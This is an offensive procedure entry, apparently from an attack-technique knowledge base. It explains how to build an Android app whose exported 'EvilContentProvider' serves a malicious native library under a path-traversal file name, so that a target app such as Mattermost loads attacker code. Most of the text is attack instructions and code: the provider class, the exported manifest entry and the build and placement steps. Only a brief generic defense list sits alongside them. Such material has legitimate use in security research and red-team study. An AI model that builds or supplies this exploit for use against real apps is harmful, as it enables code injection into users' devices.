---
id: proc-uuid-1
tags:
  - android
  - malicious-app
  - content-provider
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Android
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[T1566.001]]'
updated_at: '2025-12-14T17:24:45.209Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[T1566.001]]'
---
# Create-Malicious-Android-App-with-EvilContentProvider

## Summary

This procedure creates a custom Android application with an EvilContentProvider that serves malicious files via content URIs, enabling path traversal payloads to be sent to target apps like Mattermost. It is used to simulate a third-party app sharing malicious content that exploits validation flaws in receivers.

## Description

The procedure involves developing an Android app using the Android SDK and Java. The EvilContentProvider extends ContentProvider and overrides query() to return a MatrixCursor with columns including DISPLAY_NAME set to a traversal string (e.g., "../../lib-main/libyoga.so"). When queried, it opens the actual malicious file (e.g., a renamed libevil-lib.so) from the app's data directory. This provider is exported in AndroidManifest.xml with a URI authority like "com.example.android.pocok". Prerequisites include Android Studio for development and a target Android device/emulator. Expected outcome: An APK that can be installed and used to provide malicious URIs for intent-based attacks.

## Requirements

1. Android Studio installed with SDK (API level matching target, e.g., 30)
2. Knowledge of Android app development (Intents, ContentProviders)
3. Access to build and sign APK
4. Malicious library file prepared (e.g., compiled .so with payload)

## Defense

Defensive measures and detection strategies:

- Restrict app installations to trusted sources (Google Play Protect)
- Monitor for suspicious ContentProvider queries via app sandboxing
- Use runtime permission checks for file access

## Objectives

1. Prepare a payload provider for traversal exploitation
2. Enable intent-based delivery of malicious files
3. Achieve initial access via app installation

## Instructions

### Step 1: Set Up Project in Android Studio

**Context**: Create a new Android project and configure the EvilContentProvider class.

Implement EvilContentProvider.java:

```java
public class EvilContentProvider extends ContentProvider {
    @Override
    public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
        MatrixCursor cursor = new MatrixCursor(new String[] {"_display_name", "_data"});
        String path = uri.getQueryParameter("path");
        String name = uri.getQueryParameter("name");
        cursor.addRow(new Object[] {name, path});
        return cursor;
    }
    // Implement other overrides: openFile, etc., to return FileInputStream of malicious .so
}
```

> This sets up the provider to return traversed DISPLAY_NAME and open the malicious file.

### Step 2: Register Provider in Manifest

**Context**: Export the provider to allow external queries.

Edit AndroidManifest.xml:

```xml
<provider android:name=".EvilContentProvider"
    android:authorities="com.example.android.pocok"
    android:exported="true"
    android:permission="android.permission.READ_EXTERNAL_STORAGE" />
```

> Ensures the provider is queryable via content:// URIs.

### Step 3: Build and Place Malicious File

**Context**: Compile the app and copy the malicious library to the app's lib directory post-install.

Use Android Studio Build > Make Project, then generate signed APK.

> Expected: APK with embedded provider; manually push libevil-lib.so to /data/data/com.example.android.pocok/lib/ via ADB if needed.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[T1566.001]] Phishing: Spearphishing Attachment

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- android
- malicious-app
- content-provider
